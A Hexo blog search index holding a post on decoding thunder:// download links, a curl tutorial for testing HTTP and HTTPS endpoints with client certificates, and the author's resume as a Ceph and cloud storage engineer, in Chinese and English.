<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>迅雷下载解析（上）</title>
    <url>/2016/05/25/20160525-xunlei-download-parse/</url>
    <content><![CDATA[<h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><p>所有使用非windows的用户在需要下载迅雷资源的时候，大概都有两种方法。其一，使用wine，装一个xunlei，然后下载资源；其二，利用离线下载，先下载到离线服务器上，然后利用http或ftp协议下载到本地。</p>
<p>为啥迅雷不开发一个linux版呢！（个人猜测，估计是怕linux里面的license吧）相信为啥没有linux版本，只有迅雷知道。</p>
<p>为了能让linux下载迅雷资源，做了如下调研。。。</p>
<h1 id="thunder-地址解码"><a href="#thunder-地址解码" class="headerlink" title="thunder 地址解码"></a>thunder 地址解码</h1><p>通常能看到的 thunder 地址，都是通过base64 encode 过的 http 或 ftp 地址。所以解码，也需要用base64</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">base64</span> 加密后的http 或 ftp 地址</span></span><br><span class="line">thunder://QUFmdHA6Ly9keWdvZDE6ZHlnb2QxQGQxMzEuZHlnb2QuY246MzA0OS/pnZ7or5rli7/mibBEVkRzY3IvW+eUteW9seWkqeWggnd3dy5keWdvZC5jbl3pnZ7or5rli7/mibBjZDEucm12Ylpa</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">经过 <span class="built_in">base64</span> -d decode 之后</span></span><br><span class="line">echo QUFmdHA6Ly9keWdvZDE6ZHlnb2QxQGQxMzEuZHlnb2QuY246MzA0OS/pnZ7or5rli7/mibBEVkRzY3IvW+eUteW9seWkqeWggnd3dy5keWdvZC5jbl3pnZ7or5rli7/mibBjZDEucm12Ylpa | base64 -d</span><br><span class="line"></span><br><span class="line">AAftp://dygod1:dygod1@d131.dygod.cn:3049/非诚勿扰DVDscr/[电影天堂www.dygod.cn]非诚勿扰cd1.rmvbZZ%</span><br></pre></td></tr></table></figure>

<p>看到了吧，去掉开头的“AA”，去掉结尾的“ZZ%”，就剩下了一个ftp地址，这个ftp地址，就是迅雷下载时使用的ftp地址。</p>
<h1 id="迅雷资源下载"><a href="#迅雷资源下载" class="headerlink" title="迅雷资源下载"></a>迅雷资源下载</h1><p>使用 wget 下载上文中的ftp资源</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wget -v ftp://i:i@d3.dl1234.com:6958/\[电影天堂www.dy2018.com\]神战权力之眼BD中英双字.rmvb</span></span><br><span class="line">--2016-05-25 14:58:52--  ftp://i:*password*@d3.dl1234.com:6958/[%E7%94%B5%E5%BD%B1%E5%A4%A9%E5%A0%82www.dy2018.com]%E7%A5%9E%E6%88%98%E6%9D%83%E5%8A%9B%E4%B9%8B%E7%9C%BCBD%E4%B8%AD%E8%8B%B1%E5%8F%8C%E5%AD%97.rmvb</span><br><span class="line">           =&gt; ‘.listing’</span><br><span class="line">Resolving d3.dl1234.com (d3.dl1234.com)... 218.93.205.139</span><br><span class="line">Connecting to d3.dl1234.com (d3.dl1234.com)|218.93.205.139|:6958... failed: Connection refused.</span><br><span class="line">--2016-05-25 14:58:52--  ftp://i:*password*@d3.dl1234.com:6958/[%E7%94%B5%E5%BD%B1%E5%A4%A9%E5%A0%82www.dy2018.com]%E7%A5%9E%E6%88%98%E6%9D%83%E5%8A%9B%E4%B9%8B%E7%9C%BCBD%E4%B8%AD%E8%8B%B1%E5%8F%8C%E5%AD%97.rmvb</span><br><span class="line">           =&gt; ‘.listing’</span><br><span class="line">Connecting to d3.dl1234.com (d3.dl1234.com)|218.93.205.139|:6958... failed: Connection refused.</span><br></pre></td></tr></table></figure>
<p>结果被无情的 refused 了，后来又用别的ftp客户端尝试下载结果，依然失败。。。</p>
<p>痛定思痛，上网搜索了一下，有片文章的分析我觉得可能是正确的，其文如下：</p>
<p>”（我揣测）迅雷走的是P2SP，也就是先访问它的索引server，找到真实可用的ip。换句话说，这个URL仅仅起到一个资源标识符的作用，本身也许未必能直接用于下载。 所以说这个东西，不逆向官方客户端恐怕是没法搞的，因为不知道它和服务器之间的协议。“</p>
<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>根据网友的分析，后续可以下载一个迅雷软件分析看看</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://github.com/soimort/you-get/issues/929">能支持迅雷下载地址么？（类似thunder:&#x2F;&#x2F;）</a></li>
</ul>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>thunder</tag>
      </tags>
  </entry>
  <entry>
    <title>cURL用法</title>
    <url>/2016/11/28/curl-usage/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在 *nix 环境下，若要对http server提供的RESTful接口进行测试，往往需要安装一些HTTP Client工具，然后在输入URL、参数、Method等，组成HTTP协议后发送测试。这种HTTP Client工具大都以浏览器插件形式提供。今天介绍一些curl使用方法，来替代HTTP Client。此处只是一个应用举例，关于curl更多操作请参考man手册</p>
<h1 id="curl简介"><a href="#curl简介" class="headerlink" title="curl简介"></a>curl简介</h1><p>curl命令是一个功能强大的网络工具，它能够通过http、ftp等方式下载文件，也能够上传文件。curl命令使用了libcurl库来实现，libcurl库常用在C程序中用来处理HTTP请求，curlpp是libcurl的一个C++封装，这几个东西可以用在抓取网页、网络监控等方面的开发，而curl命令可以帮助来解决开发过程中遇到的问题。</p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><h2 id="Mac环境"><a href="#Mac环境" class="headerlink" title="Mac环境"></a>Mac环境</h2><ul>
<li>OS : os x 10.11.6</li>
<li>curl : url 7.43.0 (x86_64-apple-darwin15.0) libcurl&#x2F;7.43.0 SecureTransport zlib&#x2F;1.2.5</li>
<li>openssl : OpenSSL 0.9.8zh 14 Jan 2016</li>
</ul>
<h2 id="Linux环境"><a href="#Linux环境" class="headerlink" title="Linux环境"></a>Linux环境</h2><ul>
<li>OS : Red Hat Enterprise Linux Server release 7.2 (Maipo)</li>
<li>curl : curl 7.29.0 (x86_64-redhat-linux-gnu) libcurl&#x2F;7.29.0 NSS&#x2F;3.16.2.3 Basic ECC zlib&#x2F;1.2.7 libidn&#x2F;1.28 libssh2&#x2F;1.4.3</li>
<li>openssl : OpenSSL 1.0.1e-fips 11 Feb 2013</li>
</ul>
<h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><h2 id="HTTP请求命令格式"><a href="#HTTP请求命令格式" class="headerlink" title="HTTP请求命令格式"></a>HTTP请求命令格式</h2><h3 id="HTTP命令"><a href="#HTTP命令" class="headerlink" title="HTTP命令"></a>HTTP命令</h3><p>** curl {URL}?{参数} -X {Http Method} -H “{Header信息}” -d “{body信息}” -v **</p>
<p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://127.0.0.1:80/test?param=help -X PUT -H &quot;Connection:keep-alive&quot; -d &quot;Hello world&quot; -v</span><br></pre></td></tr></table></figure>

<h2 id="HTTPS请求命令格式"><a href="#HTTPS请求命令格式" class="headerlink" title="HTTPS请求命令格式"></a>HTTPS请求命令格式</h2><h3 id="导入HTTPS需要的证书"><a href="#导入HTTPS需要的证书" class="headerlink" title="导入HTTPS需要的证书"></a>导入HTTPS需要的证书</h3><p>*** 此处以pkcs12证书为例 ***</p>
<h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><p>双击证书文件，按提示步骤导入证书文件</p>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>Linux下证书存在于<code>/etc/pki/nssdb</code>中，可使用<code>certutil -d sql:/etc/pki/nssdb -L</code>命令查询数据库中的证书，使用<code>certutil -d sql:/etc/pki/nssdb -D -n &lt;证书名&gt;</code>删除证书，使用<code>certuil -d sql:/etc/pki/nssdb -A -t &quot;C,,&quot; -n &lt;证书名&gt; -i &lt;cer证书文件路径&gt;</code>添加cer证书，如果是p12证书其添加方法为<code>p12util -d sql:/etc/pki/nssdb -i &lt;p12证书文件&gt;</code>。<br>本文中用到的证书正是p12证书，所以可用p12util去添加证书。</p>
<h3 id="HTTPS命令"><a href="#HTTPS命令" class="headerlink" title="HTTPS命令"></a>HTTPS命令</h3><h4 id="Mac-1"><a href="#Mac-1" class="headerlink" title="Mac"></a>Mac</h4><p>** curl {URL}?{参数} -k –cert {证书.p12}:{证书密码} -X {Http Method} -H “{Header信息}” -d “{body信息}” -v **<br>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl https://127.0.0.1:8787/test?param=help -k --cert cert.p12:pasword -X PUT -H &quot;Connection:keep-alive&quot; -d &quot;Hello world&quot; -v</span><br></pre></td></tr></table></figure>

<h4 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h4><p>** curl {URL}?{参数} -k -X {Http Method} -H “{Header信息}” -d “{body信息}” -v **<br>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl https://127.0.0.1:8787/test?param=help -k -X PUT -H &quot;Connection:keep-alive&quot; -d &quot;Hello world&quot; -v</span><br></pre></td></tr></table></figure>


<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://superuser.com/questions/851604/mac-os-x-yosemite-and-client-ssl-certificates">Mac OS X Yosemite and Client SSL Certificates</a></li>
<li><a href="http://www.cnblogs.com/gbyukg/p/3326825.html">CURL常用命令</a></li>
<li><a href="https://segmentfault.com/q/1010000006665586">HTTP PUT请求该如何传输请求参数呢</a></li>
<li><a href="http://blog.csdn.net/gubenpeiyuan/article/details/8528747">curl命令总结，Http Post_Get 常用</a></li>
<li><a href="http://www.cnblogs.com/sunada2005/p/3829772.html">curl命令可以用来构造http请求</a></li>
<li><a href="http://blog.csdn.net/jwzh_cs/article/details/7897272">导入&#x2F;导出&#x2F;删除 Chrome for Linux 的个人证书</a></li>
</ul>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>curl</tag>
        <tag>http</tag>
        <tag>cert</tag>
        <tag>p12</tag>
      </tags>
  </entry>
  <entry>
    <title>工作简历</title>
    <url>/1984/10/10/introduce/</url>
    <content><![CDATA[<p><img src="/images/me.png" alt="introduce"></p>
<h1 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h1><p> bob ｜ 男 ｜ 汉族 ｜ 辽宁沈阳人 ｜ 本科学历 </p>
<h1 id="教育情况"><a href="#教育情况" class="headerlink" title="教育情况"></a>教育情况</h1><p>2003&#x2F;09 ~ 2007&#x2F;07 | 沈阳大学 ｜ 计算机科学与技术 ｜ 本科</p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本人拥有多年的软件开发经验，特别是在分布式存储和云计算领域。精通C&#x2F;C++和Golang编程语言，熟悉Python和Shell脚本，并且对Linux操作系统及其内核有深入了解。曾在多家知名企业担任资深开发工程师和架构师，主导并参与了多个重要的云平台和存储系统项目开发，包括Ceph分布式存储系统的深度开发与性能优化、云数据库的设计与实施，以及多云平台的架构设计</p>
<h2 id="技能情况"><a href="#技能情况" class="headerlink" title="技能情况"></a>技能情况</h2><ul>
<li>掌握多种开发语言及脚本，精通C&#x2F;C++、golang，熟悉Python、Shell</li>
<li>能熟练使用ubuntu、debian、centos、archlinux操作系统，熟悉linux内核</li>
<li>熟悉分布式存储Ceph</li>
<li>熟悉容器技术docker，及其原理</li>
</ul>
<p>Detail: <a href="https://zhoubofsy.github.io/">https://zhoubofsy.github.io</a></p>
<h1 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h1><p>Email：<a href="mailto:&#122;&#x68;&#111;&#117;&#98;&#x6f;&#102;&#115;&#x79;&#x40;&#104;&#x6f;&#116;&#x6d;&#x61;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;">&#122;&#x68;&#111;&#117;&#98;&#x6f;&#102;&#115;&#x79;&#x40;&#104;&#x6f;&#116;&#x6d;&#x61;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;</a><br>电话：***********</p>
<h1 id="工作项目经历"><a href="#工作项目经历" class="headerlink" title="工作项目经历"></a>工作项目经历</h1><h2 id="2020-12-–-Now"><a href="#2020-12-–-Now" class="headerlink" title="2020&#x2F;12 – Now"></a>2020&#x2F;12 – Now</h2><h3 id="建信金科"><a href="#建信金科" class="headerlink" title="建信金科"></a>建信金科</h3><p><strong>职位</strong> : 资深开发工程师<br><strong>工作描述</strong></p>
<ul>
<li>负责CFS文件存储功能设计开发、运维等工作</li>
<li>负责TCE(腾讯云存储)代码编译及分析</li>
<li>负责MultiCloud平台相关Provider开发（代码请见：<a href="https://github.com/zhoubofsy/iaas-api-server">iaas-api-server</a> ）</li>
<li>负责MultiCloud平台需要的vsphere SDK开发（<a href="https://github.com/zhoubofsy/vsphere-go-sdk">vsphere-go-sdk</a>）</li>
<li>负责Ceph部署及开发</li>
</ul>
<h2 id="2019-09-–-2020-12"><a href="#2019-09-–-2020-12" class="headerlink" title="2019&#x2F;09 – 2020&#x2F;12"></a>2019&#x2F;09 – 2020&#x2F;12</h2><h3 id="北京网众共创科技有限公司"><a href="#北京网众共创科技有限公司" class="headerlink" title="北京网众共创科技有限公司"></a>北京网众共创科技有限公司</h3><p><strong>职位</strong> : 资深云平台开发工程师<br><strong>工作描述</strong></p>
<ul>
<li>负责分布式存储（Ceph）的运维</li>
<li>负责分布式存储（Ceph）的开发(RGW的二次开发，代码请见：<a href="https://github.com/zhoubofsy/ceph/commits/3-apimask/">https://github.com/zhoubofsy/ceph/commits/3-apimask/</a>)</li>
<li>S3迁移工具设计开发（代码请见：<a href="https://github.com/zhoubofsy/s3sooner%EF%BC%89">https://github.com/zhoubofsy/s3sooner）</a></li>
</ul>
<h2 id="2019-04-–-2019-08"><a href="#2019-04-–-2019-08" class="headerlink" title="2019&#x2F;04 – 2019&#x2F;08"></a>2019&#x2F;04 – 2019&#x2F;08</h2><h3 id="海南易建科技股份有限公司"><a href="#海南易建科技股份有限公司" class="headerlink" title="海南易建科技股份有限公司"></a>海南易建科技股份有限公司</h3><p><strong>职位</strong> : 架构师<br><strong>工作描述</strong></p>
<ul>
<li>负责分布式存储（Ceph）方案调研及制定；</li>
<li>负责分布式存储Ceph性能优化；</li>
<li>负责分布式存储Ceph与XenServer集成；（代码请见：<a href="https://github.com/zhoubofsy/rbdsr/commits/master/%EF%BC%89">https://github.com/zhoubofsy/rbdsr/commits/master/）</a></li>
<li>负责云数据库设计及开发（代码请见：<a href="https://github.com/zhoubofsy/RDS%EF%BC%89">https://github.com/zhoubofsy/RDS）</a></li>
</ul>
<h2 id="2016-03-–-2018-05"><a href="#2016-03-–-2018-05" class="headerlink" title="2016&#x2F;03 – 2018&#x2F;05"></a>2016&#x2F;03 – 2018&#x2F;05</h2><h3 id="海南易建科技股份有限公司-1"><a href="#海南易建科技股份有限公司-1" class="headerlink" title="海南易建科技股份有限公司"></a>海南易建科技股份有限公司</h3><p><strong>职位</strong> : 架构师<br><strong>工作描述</strong></p>
<ul>
<li>负责分布式存储（Ceph）方案调研及制定；</li>
<li>负责分布式存储Ceph性能优化；</li>
<li>负责分布式存储Ceph与XenServer集成；（代码请见：<a href="https://github.com/zhoubofsy/RBDSR-1/commits/master/%EF%BC%89">https://github.com/zhoubofsy/RBDSR-1/commits/master/）</a></li>
<li>负责Docker相关技术调研；</li>
</ul>
<h3 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h3><h4 id="易建IAAS云平台"><a href="#易建IAAS云平台" class="headerlink" title="易建IAAS云平台"></a>易建IAAS云平台</h4><p><strong>项目介绍</strong> ：<br>云平台是以云计算平台为核心，集成多种优质云产品，致力为用户提供一体化云服务，打造多云产品集成、跨数据中心管理的企业级综合平台，平台应用开源云平台架构，基于Xen\VMWare虚拟化技术，保障了云平台的高可用性，云管理平台提供数据中心管理、集群管理、宿主机管理、存储管理、网络管理、模板管理、快照管理等资源管理功能。整合优质资源用户提供云服务器、负载均衡、弹性伸缩服务、云盘、数据备份、云监控、资源扩展等多种优质云服务。云平台提供VLAN、GRE网络隔离技术，主备部署模式等，保证了平台的高安全性和高可靠性。<br><strong>责任描述</strong> :</p>
<ol>
<li>分布式存储Ceph方案设计</li>
<li>分布式存储Ceph可靠性调优，及性能优化</li>
<li>分布式存储Ceph RBD与XenServer集成</li>
</ol>
<h4 id="云数据库"><a href="#云数据库" class="headerlink" title="云数据库"></a>云数据库</h4><p><strong>项目介绍</strong> :<br>以MariaDB为依托，将一个现有的数据库优化到云环境中，可以使用户按照存储容量和带宽的需求使用，可以将数据库从一个地方移到另一个地方，可实现按需扩展和高可用性。用户能够在RDS控制台轻松的完成数据库申请和创建，RDS实例在几分钟内就可以准备就绪并投入使用。用户通过RDS提供的功能完善的控制台，对所有实例进行统一管理。RDS具有故障自动单点切换、数据库自动备份等功能，保证RDS实例高可用和数据安全。RDS支付的费用远低于自建数据库所需的成本，用户可以根据自己的需求选择不同套餐，使用很低的价格得到一整套专业的数据库支持服务。</p>
<p><strong>责任描述</strong> :</p>
<ol>
<li>云数据库技术调研</li>
<li>云数据库架构设计</li>
<li>云数据库后台架构代码编写</li>
</ol>
<hr>
<h2 id="2014-05-–-2016-03"><a href="#2014-05-–-2016-03" class="headerlink" title="2014&#x2F;05 – 2016&#x2F;03"></a>2014&#x2F;05 – 2016&#x2F;03</h2><h3 id="东网科技有限公司"><a href="#东网科技有限公司" class="headerlink" title="东网科技有限公司"></a>东网科技有限公司</h3><p><strong>职位</strong> : 云计算存储高级软件工程师<br><strong>工作描述</strong> : </p>
<ul>
<li>负责分布式存储（Ceph）方案调研及制定；</li>
<li>负责分布式存储 Ceph 二次开发及深度定制；</li>
</ul>
<h3 id="项目-1"><a href="#项目-1" class="headerlink" title="项目"></a>项目</h3><h4 id="东网云平台"><a href="#东网云平台" class="headerlink" title="东网云平台"></a>东网云平台</h4><p><strong>项目介绍</strong> :<br>东网云平台，是一种混合云平台，依托KVM虚拟化技术，在OpenStack基础上构建而成，为客户提供IAAS服务和存储服务</p>
<p><strong>责任描述</strong> :</p>
<ol>
<li>为openstack提供快设备</li>
<li>提供对象存储服务(radosgw)</li>
<li>ceph部署方案设计</li>
<li>ceph可靠性调优，性能优化</li>
<li>radosgw对象存储接口开发</li>
<li>librados代码分析</li>
<li>cursh代码分析</li>
</ol>
<hr>
<h2 id="2012-07-–-2014-04"><a href="#2012-07-–-2014-04" class="headerlink" title="2012&#x2F;07 – 2014&#x2F;04"></a>2012&#x2F;07 – 2014&#x2F;04</h2><h3 id="浪潮（北京）电子信息产业有限公司"><a href="#浪潮（北京）电子信息产业有限公司" class="headerlink" title="浪潮（北京）电子信息产业有限公司"></a>浪潮（北京）电子信息产业有限公司</h3><p><strong>职位</strong> : 高级软件工程师<br><strong>工作描述</strong> :</p>
<ul>
<li>负责linux、solaris平台下存储虚拟化程序设计、编码工作</li>
</ul>
<h3 id="项目-2"><a href="#项目-2" class="headerlink" title="项目"></a>项目</h3><h4 id="AS1200双控制器存储虚拟化"><a href="#AS1200双控制器存储虚拟化" class="headerlink" title="AS1200双控制器存储虚拟化"></a>AS1200双控制器存储虚拟化</h4><p><strong>项目介绍</strong> :<br>AS1200存储系统，具备NAS、IPSAN、FCSAN功能，提供多级数据保护功能，解决数据存取和业务持续运行问题。支持本地持续数据保护、异地容灾功能，兼备高可靠、高性能、多功能等特性。</p>
<p><strong>时间</strong> : 2012&#x2F;07 – 2013&#x2F;06<br><strong>系统</strong> : linux, Solaris(Openindiana)<br><strong>工具</strong> : VIM, GDB, GCC</p>
<p><strong>责任描述</strong> :</p>
<ol>
<li>livestor的设计及编码工作；</li>
<li>solaris(Openindiana) devfs（设备文件系统）原理调研；</li>
<li>solaris(Openindiana) devfsadm 命令原理调研；</li>
<li>solaris(Openindiana) 内核Bug调查及修改;</li>
</ol>
<h4 id="高可用集群系统"><a href="#高可用集群系统" class="headerlink" title="高可用集群系统"></a>高可用集群系统</h4><p><strong>项目介绍</strong> :<br>高可用集群的出现是为了使集群的整体服务尽可能可用，从而减少由计算机硬件和软件易错性所带来的损失。如果某个节点失效，它的备援节点将接管它的职责。因此，对于用户而言，集群永远不会停机。高可用集群软件的主要作用就是实现故障检查和业务切换的自动化。</p>
<p><strong>时间</strong> : 2012&#x2F;07 – 2014&#x2F;04<br><strong>系统</strong> : linux、windows2000、windows2003、windows2008、windows2012<br><strong>工具</strong> : vc6、vs2005、vs2010、vs2012、wdk7、wdk8、gcc、gdb、vim<br><strong>责任描述</strong> : </p>
<ol>
<li>LRM（Local Resources Manage）本地资源模块设计编码</li>
<li>HB 心跳模块设计编码</li>
<li>HaDsk磁盘过滤驱动设计编码（windows版）</li>
</ol>
<hr>
<h2 id="2010-08-–-2012-04"><a href="#2010-08-–-2012-04" class="headerlink" title="2010&#x2F;08 – 2012&#x2F;04"></a>2010&#x2F;08 – 2012&#x2F;04</h2><h3 id="北京聚利科技有限公司"><a href="#北京聚利科技有限公司" class="headerlink" title="北京聚利科技有限公司"></a>北京聚利科技有限公司</h3><p><strong>职位</strong> : 高级软件工程师<br><strong>工作描述</strong> ：</p>
<ul>
<li>负责产品需求分析、架构设计、模块设计、编码工作</li>
</ul>
<h3 id="项目-3"><a href="#项目-3" class="headerlink" title="项目"></a>项目</h3><h4 id="北京出租车新地标车载信息系统——中控"><a href="#北京出租车新地标车载信息系统——中控" class="headerlink" title="北京出租车新地标车载信息系统——中控"></a>北京出租车新地标车载信息系统——中控</h4><p><strong>项目介绍</strong> :<br>为中控应用程序提供硬件支持</p>
<ol>
<li>SPI转发串口数据</li>
<li>GPRS连接网络</li>
<li>应用程序自启动</li>
<li>GPIO控制</li>
<li>自断电控制</li>
<li>RTC同步</li>
</ol>
<p><strong>时间</strong> : 2011&#x2F;08 – 2012&#x2F;04<br><strong>系统</strong> ：WinCE6.0<br><strong>硬件</strong> ：SirfA4（ARM）<br><strong>工具</strong> : PlatformBuilder6.0 , VS2005<br><strong>责任描述</strong> :</p>
<ol>
<li>需求分析</li>
<li>整体架构设计</li>
<li>SPI转发串口数据模块设计、编码及测试</li>
<li>应用程序自启动模块设计、编码及测试</li>
<li>GPIO控制模块设计、编码及测试</li>
<li>自断电控制模块设计、编码及测试</li>
<li>wince内核定制</li>
</ol>
<h4 id="北京出租车新地标车载信息系统——计价器-TXN-13"><a href="#北京出租车新地标车载信息系统——计价器-TXN-13" class="headerlink" title="北京出租车新地标车载信息系统——计价器(TXN-13)"></a>北京出租车新地标车载信息系统——计价器(TXN-13)</h4><p><strong>项目介绍</strong> :<br>为出租车司机提供计价、娱乐、电话、导航、召调车等服务</p>
<ol>
<li>计价功能</li>
<li>娱乐功能(音频文件和视频文件的播放)</li>
<li>实现中心调车、召车、打电话、导航、等辅助功能</li>
</ol>
<p><strong>时间</strong> : 2010&#x2F;08 – 2012&#x2F;04<br><strong>系统</strong> : wince6.0、windows xp<br><strong>硬件</strong> ：SirfA4 , x86<br><strong>工具</strong> : vs2005<br><strong>责任描述</strong> :</p>
<ol>
<li>需求分析</li>
<li>整体架构设计</li>
<li>计价模块设计、编码及测试</li>
<li>多媒体模块设计、编码及测试</li>
<li>出租车多功能业务模块设计、编码及测试</li>
</ol>
<hr>
<h2 id="2007-10-–-2010-04"><a href="#2007-10-–-2010-04" class="headerlink" title="2007&#x2F;10 – 2010&#x2F;04"></a>2007&#x2F;10 – 2010&#x2F;04</h2><h3 id="沈阳美行科技有限公司"><a href="#沈阳美行科技有限公司" class="headerlink" title="沈阳美行科技有限公司"></a>沈阳美行科技有限公司</h3><p><strong>职位</strong> : 软件工程师<br><strong>工作描述</strong> : </p>
<ul>
<li>负责模块设计，编码，测试等相关工作</li>
</ul>
<h3 id="项目-4"><a href="#项目-4" class="headerlink" title="项目"></a>项目</h3><h4 id="道道通导航系统"><a href="#道道通导航系统" class="headerlink" title="道道通导航系统"></a>道道通导航系统</h4><p><strong>项目介绍</strong> :<br>道福特蒙迪欧车载导航系统、道通导航系统，为客户提供，地图浏览、数据检索、卫星定位、路线引导、语音提示、路线计算、实时路况等服务</p>
<p><strong>时间</strong> : 2007&#x2F;05 – 2010&#x2F;03<br><strong>系统</strong> : Windows CE、windows xp<br><strong>硬件</strong> : MIPS、ARM、x86<br><strong>工具</strong> : vs2005<br><strong>责任描述</strong> :</p>
<ol>
<li>地图描画数据制作模块的设计、编码、测试</li>
<li>UI部分画页的设计、编码、测试</li>
<li>用户数据备份与恢复模块的设计、编码、测试</li>
<li>地图描画数据制作模块的设计、编码、测试</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>Resume</title>
    <url>/1984/10/10/introduce_en/</url>
    <content><![CDATA[<p><img src="/images/me.png" alt="introduce"></p>
<h1 id="Basic-Information"><a href="#Basic-Information" class="headerlink" title="Basic Information"></a>Basic Information</h1><p>Zhou Bo | male | Han nationality | Shenyang, Liaoning</p>
<h1 id="Educational-Background"><a href="#Educational-Background" class="headerlink" title="Educational Background"></a>Educational Background</h1><p>2003&#x2F;09 ~ 2007&#x2F;07 | Shenyang University | Computer Science and Technology | Undergraduate</p>
<h1 id="Brief-introduction"><a href="#Brief-introduction" class="headerlink" title="Brief introduction"></a>Brief introduction</h1><p>I have many years of experience in software development, especially in the field of distributed storage and cloud computing. Proficient in C&#x2F;C++ and Golang programming languages, familiar with Python and shell scripting, and in-depth knowledge of the Linux operating system and its kernel. He has worked as a senior development engineer and architect in many well-known enterprises, and has led and participated in the development of a number of important cloud platform and storage system projects, including the in-depth development and performance optimization of Ceph distributed storage system, the design and implementation of cloud databases, and the architecture design of multi-cloud platforms</p>
<h2 id="Skills"><a href="#Skills" class="headerlink" title="Skills"></a>Skills</h2><ul>
<li>Master a variety of development languages and scripts, proficient in C &#x2F; C ++, Shell, Python, familiar with golang</li>
<li>Proficient in ubuntu, debian, centos, archlinux operating system, familiar with linux kernel</li>
<li>Proficient in distributed storage Ceph</li>
<li>Familiar with container technology docker, and its principles</li>
</ul>
<h2 id="Detail"><a href="#Detail" class="headerlink" title="Detail"></a>Detail</h2><p><a href="https://zhoubofsy.github.io/">https://zhoubofsy.github.io</a></p>
<h1 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h1><p>Email：<a href="mailto:&#122;&#104;&#111;&#117;&#98;&#111;&#x66;&#x73;&#121;&#64;&#x68;&#111;&#116;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#111;&#x6d;">&#122;&#104;&#111;&#117;&#98;&#111;&#x66;&#x73;&#121;&#64;&#x68;&#111;&#116;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#111;&#x6d;</a><br>Tel：***********</p>
<h1 id="Work-experience"><a href="#Work-experience" class="headerlink" title="Work experience"></a>Work experience</h1><h2 id="2020-12-–-Now"><a href="#2020-12-–-Now" class="headerlink" title="2020&#x2F;12 – Now"></a>2020&#x2F;12 – Now</h2><h3 id="CCB-FINTECH-CO-LTD"><a href="#CCB-FINTECH-CO-LTD" class="headerlink" title="CCB FINTECH CO., LTD."></a>CCB FINTECH CO., LTD.</h3><p><strong>Position</strong> : Senior Development Engineer</p>
<p><strong>Description</strong></p>
<ul>
<li>Responsible for the design, development, operation and maintenance of CFS file storage functions</li>
<li>Responsible for TCE (Tencent Cloud Storage) code compilation and analysis</li>
<li>Responsible for the development of MultiCloud Platform-related providers (Code Review: <a href="https://github.com/zhoubofsy/iaas-api-server">https://github.com/zhoubofsy/iaas-api-server</a>)</li>
<li>Be responsible for the development of vsphere SDK required by the MultiCloud platform (Code Review: <a href="https://github.com/zhoubofsy/vsphere-go-sdk">https://github.com/zhoubofsy/vsphere-go-sdk</a>)</li>
<li>Responsible for Ceph deployment and development</li>
</ul>
<h2 id="2019-09-–-2020-12"><a href="#2019-09-–-2020-12" class="headerlink" title="2019&#x2F;09 – 2020&#x2F;12"></a>2019&#x2F;09 – 2020&#x2F;12</h2><h3 id="Beijing-WangZhongGongChuang-Technology-Co-Ltd"><a href="#Beijing-WangZhongGongChuang-Technology-Co-Ltd" class="headerlink" title="Beijing WangZhongGongChuang Technology Co., Ltd"></a>Beijing WangZhongGongChuang Technology Co., Ltd</h3><p><strong>Position</strong> : Senior Cloud Platform Development Engineer</p>
<p><strong>Description</strong></p>
<ul>
<li>Responsible for the O&amp;M of distributed storage (Ceph)</li>
<li>Responsible for the development of distributed storage (Ceph) (Code Review: <a href="https://github.com/zhoubofsy/ceph/commits/3-apimask/">https://github.com/zhoubofsy/ceph/commits/3-apimask/</a>)</li>
<li>Design and development of S3 migration tool (Code Review: <a href="https://github.com/zhoubofsy/s3sooner">https://github.com/zhoubofsy/s3sooner</a>)</li>
</ul>
<h2 id="2016-03-–-2019-08"><a href="#2016-03-–-2019-08" class="headerlink" title="2016&#x2F;03 – 2019&#x2F;08"></a>2016&#x2F;03 – 2019&#x2F;08</h2><h3 id="eKing-Technology-Co-Ltd"><a href="#eKing-Technology-Co-Ltd" class="headerlink" title="eKing Technology Co., Ltd"></a>eKing Technology Co., Ltd</h3><p><strong>Position</strong> : Architect</p>
<p><strong>Description</strong></p>
<ul>
<li>Responsible for distributed storage (Ceph) program research and development;</li>
<li>Responsible for distributed storage Ceph performance optimization;</li>
<li>Responsible for distributed storage Ceph and XenServer integration;</li>
<li>Responsible for Docker related technology research;</li>
</ul>
